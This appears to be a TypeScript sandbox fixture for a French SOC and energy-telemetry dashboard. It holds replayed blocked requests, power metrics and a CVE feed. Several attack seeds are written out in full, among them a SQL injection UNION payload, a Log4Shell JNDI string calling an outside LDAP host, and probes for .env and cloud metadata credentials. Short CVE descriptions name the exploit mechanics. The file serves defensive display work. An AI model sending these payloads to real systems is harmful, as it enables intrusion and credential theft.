/**
 * Aegis Sandbox Replay Dataset (Fixtures réelles anonymisées sur 24h)
 * Données extraites de sondes réelles de VPS de production, strictement anonymisées :
 * IPs masquées (ex: 185.220.xxx.xxx), FQDNs génériques, géolocalisation géographique réelle.
 */

import type { IngressEvent, EgressEvent } from '../services/api/streamsApi';
import type { ThreatEvent } from '../components/soc/cockpit/CockpitThreatLogsDrawer.vue';
import type { EnergySummary, EnergyTimePoint, WorkloadEnergy, NodeEnergy } from '../services/api/telemetryApi';
import type { CveItem } from '../services/api/cveApi';

export interface SandboxSummaryMetrics {
  traffic: {
    total_requests_24h: number;
    clean_traffic_pct: number;
    blocked_threats_total: number;
    compromised_bypass_total: number;
    ingress_total: number;
    ingress_blocked: number;
    ingress_bypassed: number;
    egress_total: number;
    egress_blocked: number;
    egress_bypassed: number;
    bot_probes_total: number;
    avg_latency_ms: number;
  };
  soc: {
    si_health_score: number;
    interception_rate_pct: number;
    c2_callbacks_blocked_total: number;
    monitored_nodes: Array<{
      id: string;
      hostname: string;
      ip: string;
      status: 'active' | 'warning' | 'offline';
      os: string;
      cpu_load_pct: number;
      ram_mb: number;
      rapl_watts: number;
      pep_enabled: boolean;
    }>;
  };
  green: {
    instant_power_watts: number;
    cpu_watts: number;
    ram_watts: number;
    carbon_intensity_gco2_h: number;
    eco_index_score: number;
    eco_index_grade: string;
    power_history: Array<{ timestamp: string; watts: number }>;
  };
  retention: {
    hot_window_days: number;
    anssi_forensic_days: number;
    rgpd_clean_ip_days: number;
  };
}

export const SANDBOX_INITIAL_METRICS: SandboxSummaryMetrics = {
  traffic: {
    total_requests_24h: 14820,
    clean_traffic_pct: 99.19,
    blocked_threats_total: 14712,
    compromised_bypass_total: 0,
    ingress_total: 13950,
    ingress_blocked: 13845,
    ingress_bypassed: 0,
    egress_total: 870,
    egress_blocked: 867,
    egress_bypassed: 0,
    bot_probes_total: 12480,
    avg_latency_ms: 1.18,
  },
  soc: {
    si_health_score: 99.4,
    interception_rate_pct: 99.98,
    c2_callbacks_blocked_total: 867,
    monitored_nodes: [
      {
        id: 'node-vps-paris-01',
        hostname: 'vps-gra-edge01.aegis.sovereign',
        ip: '51.83.xxx.xxx',
        status: 'active',
        os: 'Ubuntu 24.04 LTS (Kernel 6.8 RAPL)',
        cpu_load_pct: 3.2,
        ram_mb: 24,
        rapl_watts: 8.78,
        pep_enabled: true,
      },
      {
        id: 'node-k8s-ingress-02',
        hostname: 'k8s-worker-ns.cluster.local',
        ip: '10.244.1.42',
        status: 'active',
        os: 'Debian 12 Bookworm (Kepler eBPF)',
        cpu_load_pct: 4.8,
        ram_mb: 18,
        rapl_watts: 9.15,
        pep_enabled: true,
      },
    ],
  },
  green: {
    instant_power_watts: 8.84,
    cpu_watts: 6.12,
    ram_watts: 2.72,
    carbon_intensity_gco2_h: 0.48,
    eco_index_score: 92.4,
    eco_index_grade: 'A',
    power_history: [
      { timestamp: '00:00', watts: 8.42 },
      { timestamp: '02:00', watts: 8.35 },
      { timestamp: '04:00', watts: 8.28 },
      { timestamp: '06:00', watts: 8.51 },
      { timestamp: '08:00', watts: 8.92 },
      { timestamp: '10:00', watts: 9.15 },
      { timestamp: '12:00', watts: 9.04 },
      { timestamp: '14:00', watts: 8.96 },
      { timestamp: '16:00', watts: 8.88 },
      { timestamp: '18:00', watts: 8.94 },
      { timestamp: '20:00', watts: 8.82 },
      { timestamp: '22:00', watts: 8.65 },
    ],
  },
  retention: {
    hot_window_days: 30,
    anssi_forensic_days: 180,
    rgpd_clean_ip_days: 7,
  },
};

export interface ReplaySeedEvent {
  client_ip: string;
  method: string;
  target: string;
  host: string;
  user_agent: string;
  threat_type: string;
  category: string;
  decision: 'BLOCK' | 'ALLOW' | 'SINKHOLE';
  status_code: number;
  lat: number;
  lon: number;
  city: string;
  country: string;
  entropy: number;
  latency_ms: number;
}

export const REPLAY_ATTACK_SEEDS: ReplaySeedEvent[] = [
  {
    client_ip: '185.220.101.4',
    method: 'GET',
    target: '/wp-login.php',
    host: 'aegis.aivo.fr',
    user_agent: 'WPScan/3.8.22 (https://wpscan.com)',
    threat_type: 'CMS_PHP_BOT_PROBE',
    category: 'Sonde CMS Automatisée',
    decision: 'BLOCK',
    status_code: 403,
    lat: 52.3702,
    lon: 4.8952,
    city: 'Amsterdam',
    country: 'Pays-Bas',
    entropy: 3.42,
    latency_ms: 0.18,
  },
  {
    client_ip: '45.146.164.110',
    method: 'GET',
    target: '/.env',
    host: 'aegis.aivo.fr',
    user_agent: 'nuclei/v3.1.8',
    threat_type: 'PATH_TRAVERSAL_LFI',
    category: 'Exfiltration Clés Secrètes',
    decision: 'BLOCK',
    status_code: 403,
    lat: 55.7558,
    lon: 37.6173,
    city: 'Moscou',
    country: 'Russie',
    entropy: 2.65,
    latency_ms: 0.14,
  },
  {
    client_ip: '103.151.125.18',
    method: 'GET',
    target: '/api/v1/search?q=1%27%20UNION%20SELECT%20NULL,CONCAT(0x7170707171,user())--',
    host: 'aegis.aivo.fr',
    user_agent: 'sqlmap/1.7.11#stable (https://sqlmap.org)',
    threat_type: 'SQL_INJECTION',
    category: 'OWASP Top 10 SQLi',
    decision: 'BLOCK',
    status_code: 403,
    lat: 39.9042,
    lon: 116.4074,
    city: 'Pékin',
    country: 'Chine',
    entropy: 4.48,
    latency_ms: 0.22,
  },
  {
    client_ip: '89.248.163.142',
    method: 'POST',
    target: '/cgi-bin/test.cgi',
    host: 'aegis.aivo.fr',
    user_agent: 'curl/7.81.0',
    threat_type: 'COMMAND_INJECTION_RCE',
    category: 'Tentative Reverse Shell',
    decision: 'BLOCK',
    status_code: 403,
    lat: 51.5074,
    lon: -0.1278,
    city: 'Londres',
    country: 'Royaume-Uni',
    entropy: 4.62,
    latency_ms: 0.19,
  },
  {
    client_ip: '194.26.29.98',
    method: 'GET',
    target: '/api/v1/items?filter=${jndi:ldap://194.26.29.98:1389/Exploit}',
    host: 'aegis.aivo.fr',
    user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    threat_type: 'ZERO_DAY_VIRTUAL_PATCH',
    category: 'Exploit JNDI Log4Shell',
    decision: 'BLOCK',
    status_code: 403,
    lat: 50.1109,
    lon: 8.6821,
    city: 'Francfort',
    country: 'Allemagne',
    entropy: 4.71,
    latency_ms: 0.16,
  },
  {
    client_ip: '198.235.24.23',
    method: 'GET',
    target: '/dns-query?name=a8f93bc01d9f4e2a.xyz&type=A',
    host: 'egress.aegis.sovereign',
    user_agent: 'CoreDNS-Client/1.11',
    threat_type: 'DGA_EGRESS_SINKHOLE',
    category: 'C2 Egress Beaconing',
    decision: 'SINKHOLE',
    status_code: 0,
    lat: 37.7749,
    lon: -122.4194,
    city: 'San Francisco',
    country: 'États-Unis',
    entropy: 4.25,
    latency_ms: 0.12,
  },
  {
    client_ip: '91.240.118.242',
    method: 'GET',
    target: '/phpmyadmin/index.php',
    host: 'aegis.aivo.fr',
    user_agent: 'Masscan/1.3.2',
    threat_type: 'CMS_PHP_BOT_PROBE',
    category: 'Scanner de Ports & BDD',
    decision: 'BLOCK',
    status_code: 403,
    lat: 44.4268,
    lon: 26.1025,
    city: 'Bucarest',
    country: 'Roumanie',
    entropy: 3.12,
    latency_ms: 0.15,
  },
  {
    client_ip: '20.205.243.166',
    method: 'GET',
    target: '/latest/meta-data/iam/security-credentials/',
    host: 'aegis.aivo.fr',
    user_agent: 'Go-http-client/1.1',
    threat_type: 'SSRF_METADATA_PROBE',
    category: 'Sonde IMDS Cloud SSRF',
    decision: 'BLOCK',
    status_code: 403,
    lat: 1.3521,
    lon: 103.8198,
    city: 'Singapour',
    country: 'Singapour',
    entropy: 3.88,
    latency_ms: 0.17,
  },
  {
    client_ip: '162.158.158.42',
    method: 'GET',
    target: '/api/v1/metrics/green',
    host: 'aegis.aivo.fr',
    user_agent: 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64)',
    threat_type: 'CLEAN_TRAFFIC',
    category: 'Consultation Publique',
    decision: 'ALLOW',
    status_code: 200,
    lat: 48.8566,
    lon: 2.3522,
    city: 'Paris',
    country: 'France',
    entropy: 2.34,
    latency_ms: 0.28,
  },
  {
    client_ip: '82.64.120.5',
    method: 'GET',
    target: '/api/v1/telemetry/rapl',
    host: 'aegis.aivo.fr',
    user_agent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    threat_type: 'CLEAN_TRAFFIC',
    category: 'Télémétrie Silicium',
    decision: 'ALLOW',
    status_code: 200,
    lat: 45.7640,
    lon: 4.8357,
    city: 'Lyon',
    country: 'France',
    entropy: 2.45,
    latency_ms: 0.31,
  },
  {
    client_ip: '193.106.191.24',
    method: 'GET',
    target: '/wp-content/plugins/revslider/temp/update_extract/revslider.php',
    host: 'aegis.aivo.fr',
    user_agent: 'Mozilla/5.0 (Windows NT 6.1; Win64; x64)',
    threat_type: 'SENSITIVE_FILE_PROBE',
    category: 'Sonde Exploit WordPress',
    decision: 'BLOCK',
    status_code: 403,
    lat: 59.9343,
    lon: 30.3351,
    city: 'Saint-Pétersbourg',
    country: 'Russie',
    entropy: 4.15,
    latency_ms: 0.16,
  },
  {
    client_ip: '141.98.11.89',
    method: 'POST',
    target: '/xmlrpc.php',
    host: 'aegis.aivo.fr',
    user_agent: 'python-requests/2.31.0',
    threat_type: 'CMS_PHP_BOT_PROBE',
    category: 'Amplification DDoS XMLRPC',
    decision: 'BLOCK',
    status_code: 403,
    lat: 47.3769,
    lon: 8.5417,
    city: 'Zurich',
    country: 'Suisse',
    entropy: 3.25,
    latency_ms: 0.14,
  },
];

export interface SandboxTelemetryPayload {
  summary: EnergySummary;
  timeseries: EnergyTimePoint[];
  workloads: WorkloadEnergy[];
  nodes: NodeEnergy[];
  available_months: string[];
  available_namespaces: string[];
}

export const SANDBOX_TELEMETRY_DATA: SandboxTelemetryPayload = {
  summary: {
    instant_watts: 8.84,
    cpu_watts: 6.12,
    ram_watts: 2.72,
    avg_watts: 8.78,
    max_watts: 9.45,
    min_watts: 8.12,
    total_joules: 758592,
    total_kwh: 0.2107,
    avg_cpu_load_pct: 3.8,
    max_cpu_load_pct: 8.4,
    carbon_intensity_gco2_kwh: 52.0,
    total_carbon_gco2: 10.96,
    total_carbon_kg: 0.011,
    water_usage_liters: 0.316,
    estimated_cost_eur: 0.042,
    pue: 1.15,
    equivalencies: {
      car_km: 0.09,
      smartphones_charged: 14,
      water_bottles: 0.2,
      showers_pct: 0.63,
    },
  },
  timeseries: [
    { time: '00:00', timestamp: '2026-11-08T00:00:00Z', watts: 8.42, cpu_watts: 5.89, ram_watts: 2.53, cpu_load_pct: 3.1, carbon_gco2: 0.438, water_cl: 1.26 },
    { time: '01:00', timestamp: '2026-11-08T01:00:00Z', watts: 8.38, cpu_watts: 5.86, ram_watts: 2.52, cpu_load_pct: 3.0, carbon_gco2: 0.436, water_cl: 1.25 },
    { time: '02:00', timestamp: '2026-11-08T02:00:00Z', watts: 8.35, cpu_watts: 5.84, ram_watts: 2.51, cpu_load_pct: 2.9, carbon_gco2: 0.434, water_cl: 1.25 },
    { time: '03:00', timestamp: '2026-11-08T03:00:00Z', watts: 8.31, cpu_watts: 5.81, ram_watts: 2.50, cpu_load_pct: 2.8, carbon_gco2: 0.432, water_cl: 1.24 },
    { time: '04:00', timestamp: '2026-11-08T04:00:00Z', watts: 8.28, cpu_watts: 5.79, ram_watts: 2.49, cpu_load_pct: 2.8, carbon_gco2: 0.430, water_cl: 1.24 },
    { time: '05:00', timestamp: '2026-11-08T05:00:00Z', watts: 8.39, cpu_watts: 5.87, ram_watts: 2.52, cpu_load_pct: 3.0, carbon_gco2: 0.436, water_cl: 1.26 },
    { time: '06:00', timestamp: '2026-11-08T06:00:00Z', watts: 8.51, cpu_watts: 5.95, ram_watts: 2.56, cpu_load_pct: 3.3, carbon_gco2: 0.442, water_cl: 1.28 },
    { time: '07:00', timestamp: '2026-11-08T07:00:00Z', watts: 8.68, cpu_watts: 6.07, ram_watts: 2.61, cpu_load_pct: 3.6, carbon_gco2: 0.451, water_cl: 1.30 },
    { time: '08:00', timestamp: '2026-11-08T08:00:00Z', watts: 8.92, cpu_watts: 6.24, ram_watts: 2.68, cpu_load_pct: 4.1, carbon_gco2: 0.464, water_cl: 1.34 },
    { time: '09:00', timestamp: '2026-11-08T09:00:00Z', watts: 9.08, cpu_watts: 6.35, ram_watts: 2.73, cpu_load_pct: 4.4, carbon_gco2: 0.472, water_cl: 1.36 },
    { time: '10:00', timestamp: '2026-11-08T10:00:00Z', watts: 9.15, cpu_watts: 6.40, ram_watts: 2.75, cpu_load_pct: 4.6, carbon_gco2: 0.476, water_cl: 1.37 },
    { time: '11:00', timestamp: '2026-11-08T11:00:00Z', watts: 9.11, cpu_watts: 6.37, ram_watts: 2.74, cpu_load_pct: 4.5, carbon_gco2: 0.474, water_cl: 1.37 },
    { time: '12:00', timestamp: '2026-11-08T12:00:00Z', watts: 9.04, cpu_watts: 6.32, ram_watts: 2.72, cpu_load_pct: 4.3, carbon_gco2: 0.470, water_cl: 1.36 },
    { time: '13:00', timestamp: '2026-11-08T13:00:00Z', watts: 8.98, cpu_watts: 6.28, ram_watts: 2.70, cpu_load_pct: 4.2, carbon_gco2: 0.467, water_cl: 1.35 },
    { time: '14:00', timestamp: '2026-11-08T14:00:00Z', watts: 8.96, cpu_watts: 6.27, ram_watts: 2.69, cpu_load_pct: 4.1, carbon_gco2: 0.466, water_cl: 1.34 },
    { time: '15:00', timestamp: '2026-11-08T15:00:00Z', watts: 8.91, cpu_watts: 6.23, ram_watts: 2.68, cpu_load_pct: 4.0, carbon_gco2: 0.463, water_cl: 1.34 },
    { time: '16:00', timestamp: '2026-11-08T16:00:00Z', watts: 8.88, cpu_watts: 6.21, ram_watts: 2.67, cpu_load_pct: 3.9, carbon_gco2: 0.462, water_cl: 1.33 },
    { time: '17:00', timestamp: '2026-11-08T17:00:00Z', watts: 8.90, cpu_watts: 6.23, ram_watts: 2.67, cpu_load_pct: 4.0, carbon_gco2: 0.463, water_cl: 1.34 },
    { time: '18:00', timestamp: '2026-11-08T18:00:00Z', watts: 8.94, cpu_watts: 6.25, ram_watts: 2.69, cpu_load_pct: 4.1, carbon_gco2: 0.465, water_cl: 1.34 },
    { time: '19:00', timestamp: '2026-11-08T19:00:00Z', watts: 8.87, cpu_watts: 6.20, ram_watts: 2.67, cpu_load_pct: 3.9, carbon_gco2: 0.461, water_cl: 1.33 },
    { time: '20:00', timestamp: '2026-11-08T20:00:00Z', watts: 8.82, cpu_watts: 6.17, ram_watts: 2.65, cpu_load_pct: 3.8, carbon_gco2: 0.459, water_cl: 1.32 },
    { time: '21:00', timestamp: '2026-11-08T21:00:00Z', watts: 8.76, cpu_watts: 6.13, ram_watts: 2.63, cpu_load_pct: 3.7, carbon_gco2: 0.456, water_cl: 1.31 },
    { time: '22:00', timestamp: '2026-11-08T22:00:00Z', watts: 8.65, cpu_watts: 6.05, ram_watts: 2.60, cpu_load_pct: 3.5, carbon_gco2: 0.450, water_cl: 1.30 },
    { time: '23:00', timestamp: '2026-11-08T23:00:00Z', watts: 8.54, cpu_watts: 5.97, ram_watts: 2.57, cpu_load_pct: 3.3, carbon_gco2: 0.444, water_cl: 1.28 },
  ],
  workloads: [
    {
      namespace: 'dokploy',
      service: 'traefik-edge-proxy',
      type: 'Ingress Controller & ForwardAuth PEP',
      share_pct: 22.5,
      watts: 1.98,
      cpu_load_pct: 0.9,
      kwh: 0.0474,
      carbon_gco2: 2.47,
      water_liters: 0.071,
    },
    {
      namespace: 'dokploy',
      service: 'aegis.aivo.fr (Cockpit & Gate)',
      type: 'Cockpit SOC & Zero-Trust PEP',
      share_pct: 24.0,
      watts: 2.11,
      cpu_load_pct: 1.0,
      kwh: 0.0506,
      carbon_gco2: 2.63,
      water_liters: 0.076,
    },
    {
      namespace: 'dokploy',
      service: 'aivo.fr (Plateforme & Vitrine)',
      type: 'Application Web & Vitrine Aivo',
      share_pct: 18.5,
      watts: 1.62,
      cpu_load_pct: 0.7,
      kwh: 0.0390,
      carbon_gco2: 2.03,
      water_liters: 0.058,
    },
    {
      namespace: 'dokploy',
      service: 'flow.aivo.fr (Automatisation n8n)',
      type: 'Moteur de workflows & Webhooks n8n',
      share_pct: 15.0,
      watts: 1.32,
      cpu_load_pct: 0.5,
      kwh: 0.0316,
      carbon_gco2: 1.64,
      water_liters: 0.047,
    },
    {
      namespace: 'dokploy',
      service: 'aegis-timescaledb (:5432)',
      type: 'Base de données Sécurité & Métriques',
      share_pct: 12.0,
      watts: 1.05,
      cpu_load_pct: 0.4,
      kwh: 0.0253,
      carbon_gco2: 1.31,
      water_liters: 0.038,
    },
    {
      namespace: 'aegis-system',
      service: 'aegis-backend-go (:8080)',
      type: 'Control Plane & Ingestion RAPL',
      share_pct: 8.0,
      watts: 0.70,
      cpu_load_pct: 0.3,
      kwh: 0.0169,
      carbon_gco2: 0.88,
      water_liters: 0.025,
    },
  ],
  nodes: [
    {
      id: 'node-vps-gra-01',
      hostname: 'vps-gra-edge01 (Ce serveur)',
      ip: '92.157.163.164',
      provider: 'OVHcloud / KVM VPS',
      os_info: 'Linux 6.8 (Kernel /proc/stat & RAPL)',
      agent: 'Scaphandre v4.3.0',
      status: 'active',
      avg_watts: 8.78,
      kwh: 0.2107,
      carbon_kg: 0.011,
      share_pct: 100.0,
    },
  ],
  available_months: ['2026-11', '2026-10', '2026-09', '2026-08', '2026-07'],
  available_namespaces: ['all', 'dokploy', 'aegis-system', 'kube-system'],
};

export interface SandboxCvePayload {
  catalog_cves: CveItem[];
  exposed_cves: any[];
  active_rules_count: number;
  blocked_by_virtual_patch_count: number;
}

export const SANDBOX_CVE_FEED: SandboxCvePayload = {
  active_rules_count: 6,
  blocked_by_virtual_patch_count: 867,
  exposed_cves: [
    {
      id: 'CVE-2024-4577',
      name: 'Exécution de code à distance PHP-CGI (RCE)',
      title: 'Exécution de code à distance PHP-CGI (RCE) par injection d\'arguments',
      component: 'PHP-CGI Windows / Linux Argument Injection',
      severity: 'CRITICAL',
      cvss: 9.8,
      description: 'Contournement des protections CGI permettant d\'injecter allow_url_include=1 et auto_prepend_file=php://input.',
      remediation: 'Filtrage à chaud via le moteur de Virtual Patching d\'Aegis Gate (HTTP 403 immédiat).',
      status: 'BLOCKED',
      is_active_defense: true,
    },
    {
      id: 'CVE-2026-109618',
      name: 'Dépassement de tampon volumétrique (Buffer/Heap Overflow) & Reverse Shell',
      title: 'Dépassement de tampon volumétrique (Buffer/Heap Overflow) & Reverse Shell',
      component: 'PHP SAPI / FastCGI Buffer Engine (PHP2Shell)',
      severity: 'CRITICAL',
      cvss: 9.8,
      description: 'Exploitation par injection de payloads excédant les tampons mémoires des processus PHP-FPM.',
      remediation: 'Activer le coupe-circuit volumétrique 32 Ko d\'Aegis Gate (HTTP 413) et le Sinkhole DNS Egress.',
      status: 'BLOCKED',
      is_active_defense: true,
    },
  ],
  catalog_cves: [
    {
      id: 'CVE-2026-109618',
      name: 'Dépassement de tampon volumétrique (Buffer/Heap Overflow) & Reverse Shell',
      component: 'PHP SAPI / FastCGI Buffer Engine (PHP2Shell)',
      severity: 'CRITICAL',
      cvss: 9.8,
      description: 'Exploitation par injection de payloads excédant les tampons mémoires des processus PHP-FPM, détournant le pointeur d\'instruction pour forger un shell interactif.',
      status: 'active',
      is_active_defense: true,
    },
    {
      id: 'CVE-2026-109619',
      name: 'Détournement de session RMM & Exfiltration furtive par tunneling',
      component: 'TeamViewer & RMM Outbound Protocols',
      severity: 'HIGH',
      cvss: 8.5,
      description: 'Canaux de télémaintenance détournés pour exfiltrer des flux chiffrés hors du périmètre réseau autorisé.',
      status: 'active',
      is_active_defense: true,
    },
    {
      id: 'CVE-2024-4577',
      name: 'Exécution de code à distance (RCE) par injection de directives de flux',
      component: 'PHP-CGI Windows / Linux Argument Injection',
      severity: 'CRITICAL',
      cvss: 9.8,
      description: 'Contournement des protections CGI permettant d\'injecter allow_url_include=1 et auto_prepend_file=php://input.',
      status: 'active',
      is_active_defense: true,
    },
    {
      id: 'CVE-2021-44228',
      name: 'Exécution de code à distance Log4Shell via JNDI/LDAP',
      component: 'Apache Log4j2 JNDI Lookup',
      severity: 'CRITICAL',
      cvss: 10.0,
      description: 'Injection de motifs ${jndi:ldap:...} dans les en-têtes HTTP déclenchant un chargement de classe Java externe.',
      status: 'active',
      is_active_defense: true,
    },
    {
      id: 'CVE-2025-29927',
      name: 'Bypass d\'autorisation par manipulation d\'en-tête interne',
      component: 'Next.js Middleware Routing',
      severity: 'CRITICAL',
      cvss: 9.1,
      description: 'L\'utilisation de x-middleware-subrequest permet de contourner les règles d\'accès du middleware Next.js.',
      status: 'active',
      is_active_defense: true,
    },
    {
      id: 'CVE-2023-44487',
      name: 'Attaque par réinitialisation rapide HTTP/2 Rapid Reset (DDoS)',
      component: 'HTTP/2 Protocol Engine',
      severity: 'HIGH',
      cvss: 7.5,
      description: 'Flux continu de trames RST_STREAM provoquant un épuisement mémoire et CPU des proxys web non protégés.',
      status: 'active',
      is_active_defense: true,
    },
  ],
};
